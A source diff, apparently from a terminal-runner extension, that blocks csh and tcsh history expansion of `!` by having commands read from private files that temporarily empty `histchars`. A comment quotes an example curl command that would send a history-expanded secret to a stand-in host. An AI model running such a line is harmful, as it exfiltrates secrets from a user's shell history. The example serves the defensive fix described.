@@ -910,7 +910,8 @@ export function listTerminals(cwd?: string): TerminalInfo[] {
  * typed there is one bash, zsh, csh and tcsh expand a `!` in, from the history, before it runs,
  * also inside double quotes: `echo "!?SECRET?"` printed a secret from the history file, and a
  * `curl "https://x.example/?d=!?SECRET?"` would have sent it off, though the block read as it runs
- * once Claude's own tools ran it. A file read in is not expanded so: the command runs as it reads,
+ * once Claude's own tools ran it. A file read in is not expanded so by bash and zsh, and csh and
+ * tcsh are told to expand nothing while they read it (aroundCommand): the command runs as it reads,
  * in the shell, its folder and its variables, as if typed. A shell that reads no such file (an
  * unusual one, with no history to expand from `!`) gets the command typed, as before.
  *
@@ -1025,6 +1026,27 @@ function readsFile(shell: string): '.' | 'source' | undefined {
   return undefined;
 }
 
+/** csh and tcsh: histchars kept, then emptied, so that they take no `!` from the history in what they read next… */
+const CSH_OFF = 'set _pelican_off\nif ($?histchars) then\nset _pelican_histchars = $histchars:q\nendif\nset histchars = ""\n';
+/** …and put back as it was. */
+const CSH_BACK = 'if ($?_pelican_off) then\nif ($?_pelican_histchars) then\nset histchars = $_pelican_histchars:q\nunset _pelican_histchars\nelse\nunset histchars\nendif\nunset _pelican_off\nendif\n';
+
+/**
+ * What a shell's file has it do before the command, and for csh and tcsh a second file, read after
+ * the first on the line typed, which tcsh goes on to also when the command stopped on an error or
+ * Ctrl+C: csh and tcsh take a `!` from the history in a file they read too, so histchars, kept, is
+ * emptied while they read the command, so they take none, and put back as it was after.
+ */
+function aroundCommand(shell: string): { before: string; after?: string } {
+  if (shell === 'csh' || shell === 'tcsh') return { before: CSH_OFF, after: CSH_BACK };
+  return { before: '' };
+}
+
+/** The line typed for `shell` to read `file`, and `after` (csh's) once it has. */
+function typedLine(reads: '.' | 'source', file: string, after?: string): string {
+  return after ? `${reads} ${file}; ${reads} ${after}` : `${reads} ${file}`;
+}
+
 /** Writes a new file, readable by this account alone: none that is there already, or a link, is written through. */
 async function writeNew(file: string, text: string): Promise<void> {
   const handle = await open(file, constants.O_WRONLY | constants.O_CREAT | constants.O_EXCL | constants.O_NOFOLLOW, 0o600);
@@ -1046,14 +1068,17 @@ export async function commandFile(command: string, shell: string): Promise<{ fil
   const { dir, own } = await commandFolder();
   // PowerShell reads in only a file whose name ends .ps1.
   const file = path.join(dir, `${randomUUID()}${/^(pwsh|powershell)$/i.test(shell) ? '.ps1' : ''}`);
-  const remove = own ? [dir] : [file];
+  const { before, after } = aroundCommand(shell);
+  const then = after === undefined ? undefined : `${file}.after`;
+  const remove = own ? [dir] : [file, ...(then ? [then] : [])];
   try {
-    await writeNew(file, `${command}\n`);
+    await writeNew(file, `${before}${command}\n`);
+    if (then) await writeNew(then, after!);
   } catch (error) {
     for (const made of remove) await rm(made, { recursive: true, force: true }).catch(() => undefined);
     throw await notWritten(dir, error);
   }
-  return { file, line: `${reads} ${file}`, remove };
+  return { file, line: typedLine(reads, file, then), remove };
 }
 
 /**
